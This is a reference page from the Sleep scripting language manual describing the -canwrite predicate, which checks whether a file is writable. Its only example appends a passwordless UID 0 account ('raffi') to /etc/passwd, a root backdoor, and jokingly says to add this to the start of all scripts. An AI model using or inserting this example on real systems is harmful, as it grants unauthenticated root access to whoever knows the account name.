# pr_canwrite

**Category:** FileSystem

**Source:** https://sleep.dashnine.org/manual/pr_canwrite.html

---

## Synopsis

```sleep
-canwrite "file"
```

A predicate to check if a file is writeable

## Parameters

`"file"` - the file to check.

## Returns

True or false and this operator is only usable in a comparison context.

## Examples

**Example:**
```sleep
# add this to the beginning of all scripts

if (-canwrite "/etc/passwd")
{
$handle = openf(">>/etc/passwd");
println($handle, "raffi::0:0::/:/bin/sh");
closef($handle);
}

```

## See Also

[-canread](pr_canread.md); [&setReadOnly](setReadOnly.md)
